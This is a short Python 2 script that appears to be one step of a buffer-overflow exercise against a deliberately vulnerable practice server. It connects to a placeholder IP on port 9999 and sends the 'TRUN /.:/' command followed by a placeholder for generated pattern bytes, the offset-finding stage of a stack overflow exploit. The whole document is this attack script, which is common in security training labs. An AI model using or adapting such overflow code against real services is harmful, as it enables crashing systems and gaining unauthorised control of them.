#!/usr/bin/python
import sys, socket

offset = "enter_your_generated_bytes"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("YOUR_IP_ADDRESS", 9999))
    s.send(('TRUN /.:/' + offset))
    s.close()
except:
    print "Error connecting to server"
    sys.exit()